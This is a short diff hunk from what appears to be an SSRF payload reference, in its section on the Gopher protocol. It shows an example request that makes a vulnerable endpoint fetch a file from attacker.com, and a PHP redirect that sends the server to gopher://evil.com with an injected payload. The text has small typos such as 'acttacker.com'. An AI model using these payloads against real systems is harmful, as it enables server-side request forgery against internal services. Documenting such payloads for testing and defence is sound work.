@@ -150,7 +150,7 @@ It is an application protocol used over an IP network to manage and access the d
    Gopher, is a distributed document delivery service. It allows users to explore, 
    search and retrieve information residing on different locations in a seamless fashion
    
-      http://example.com/ssrf.php?url=http://attacker.com/gopher.phpgopher.php (host it on acttacker.com):-
+    http://example.com/ssrf.php?url=http://attacker.com/gopher.phpgopher.php (host it on acttacker.com):-
 <?php
    header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
 ?>
